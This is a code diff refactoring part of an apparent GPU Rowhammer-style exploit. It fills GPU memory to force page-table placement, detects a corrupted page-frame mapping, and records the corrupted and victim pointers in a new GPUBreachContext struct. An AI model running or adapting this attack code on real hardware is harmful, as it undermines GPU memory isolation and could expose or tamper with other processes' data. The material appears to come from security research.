@@ -22,11 +22,9 @@ first_PT_region_attack_test (int argc, char *argv[])
   const uint64_t skip = std::stoull (argv[2]);
 
   uint8_t *temp;
-  std::vector<uint8_t *> agg_ptrs;
-  std::vector<uint64_t> agg_vec;
-  RowList agg_row_list;
-  if (!first_PT_region (num_alloc_init, threshold, skip, &agg_ptrs,
-                        &agg_row_list, &agg_vec))
+  GPUBreachContext ctx;
+
+  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: First PT Region Allocation is wrong\n");
       exit (1);
@@ -74,21 +72,18 @@ first_PT_region_attack_test (int argc, char *argv[])
 
 bool
 first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, double threshold,
-                        uint64_t skip, uint8_t ***out_region_ptrs,
-                        uint8_t **out_agg_ptr, uint8_t **out_corrupted_ptr,
-                        uint8_t **out_victim_ptr, uint64_t *out_corrupt_id,
-                        uint64_t *out_victim_id)
+                        uint64_t skip, GPUBreachContext& ctx)
 {
   uint8_t *temp;
-  std::vector<uint8_t *> agg_ptrs;
-  std::vector<uint64_t> agg_vec;
-  RowList agg_row_list;
-  if (!first_PT_region (num_alloc_init, threshold, skip, &agg_ptrs,
-                        &agg_row_list, &agg_vec))
+  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: First PT Region Allocation is wrong\n");
       exit (1);
     }
+
+  auto& agg_ptrs = ctx.step2_data.agg_ptrs;
+  auto& agg_vec = ctx.step2_data.agg_vec;
+  auto& agg_row_list = ctx.step2_data.agg_row_list;
 
   std::cout << std::dec;
   std::cout
@@ -96,11 +91,15 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       << "Filling Memory to Full Again (Consequently the First PT Region) "
       << "\n\n";
 
-  uint64_t corrupt_id, repeats = 0;
-  uint8_t *temp_addr, *corrupted_addr, *victim_addr;
-  uint8_t **region_ptrs
-      = (uint8_t **)calloc (num_alloc_post_msg * sizeof (uint8_t *), 1);
-
+  uint64_t repeats = 0;
+  uint8_t *temp_addr;
+  
+  auto& region_ptrs = ctx.step3_data.region_ptrs;
+  auto& corrupted_ptr = ctx.step3_data.corrupted_ptr;
+  auto& victim_ptr = ctx.step3_data.victim_ptr;
+  auto& corrupted_id = ctx.step3_data.corrupted_id;
+  auto& victim_id = ctx.step3_data.victim_id;
+  region_ptrs = std::vector<uint8_t *> (num_alloc_post_msg);
 
   /**
    * WARNING: this code is aggresively making all 2MB to 64KB page tables,
@@ -126,8 +125,8 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
     {
       // On Failure, Re-order and try again
       if (repeats != 0)
-        std::rotate (region_ptrs, region_ptrs + num_alloc_post_msg - 8,
-                     region_ptrs + num_alloc_post_msg);
+        std::rotate (region_ptrs.begin(), region_ptrs.begin() + num_alloc_post_msg - 8,
+                     region_ptrs.begin() + num_alloc_post_msg);
         // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
       for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
         {
@@ -202,9 +201,9 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
                           cudaMemcpyDeviceToHost);
               if (region_ptrs[i] + j != temp_addr)
                 {
-                  corrupted_addr = region_ptrs[i] + j;
-                  corrupt_id = i;
-                  victim_addr = temp_addr;
+                  corrupted_ptr = region_ptrs[i] + j;
+                  corrupted_id = i;
+                  victim_ptr = temp_addr;
                   found_mismatch = true;
                   break;
                 }
@@ -214,9 +213,9 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       if (found_mismatch)
         {
           std::cout << "After " << repeats << " repeats"<< '\n';
-          std::cout << "Corrupted: " << corrupt_id << ' '
-                    << (void *)corrupted_addr
-                    << ". Victim: " << (void *)victim_addr << '\n';
+          std::cout << "Corrupted: " << corrupted_id << ' '
+                    << (void *)corrupted_ptr
+                    << ". Victim: " << (void *)victim_ptr << '\n';
           break;
         }
       else
@@ -224,27 +223,15 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
       pause();
     }
 
-  if (out_region_ptrs)
-    *out_region_ptrs = region_ptrs;
-  if (out_agg_ptr)
-    *out_agg_ptr = nullptr;
-  if (out_corrupted_ptr)
-    *out_corrupted_ptr = corrupted_addr;
-  if (out_victim_ptr)
-    *out_victim_ptr = victim_addr;
-  if (out_corrupt_id)
-    *out_corrupt_id = corrupt_id;
-  if (out_victim_id)
+
+  uint8_t *victim_round_addr
+      = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
+  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
     {
-      uint8_t *victim_round_addr
-          = (uint8_t *)((uintptr_t)victim_addr & ~((1UL << 20) - 1));
-      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+      if (region_ptrs[i] == victim_round_addr)
         {
-          if (region_ptrs[i] == victim_round_addr)
-            {
-              *out_victim_id = i;
-              std::cout << "Found victim id." << '\n';
-            }
+          victim_id = i;
+          std::cout << "Found victim id." << '\n';
         }
     }
   std::cout << "(Step 3 Success) Found Corrupted PFN Destination: Press "
@@ -256,17 +243,14 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 }
 
 bool
-first_PT_region_attack (int argc, char *argv[], uint8_t ***out_region_ptrs,
-                        uint8_t **out_agg_ptr, uint8_t **out_corrupted_ptr,
-                        uint8_t **out_victim_ptr, uint64_t *out_corrupt_id,
-                        uint64_t *out_victim_id)
+first_PT_region_attack (int argc, char *argv[])
 {
   const uint64_t num_alloc_init = std::stoll (argv[0]);
   const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
   const double threshold = std::stod (argv[2]);
   const uint64_t skip = std::stoull (argv[3]);
+  GPUBreachContext ctx;
 
   return first_PT_region_attack (
-      num_alloc_init, num_alloc_post_msg, threshold, skip, out_region_ptrs, out_agg_ptr,
-      out_corrupted_ptr, out_victim_ptr, nullptr, nullptr);
+      num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
 }
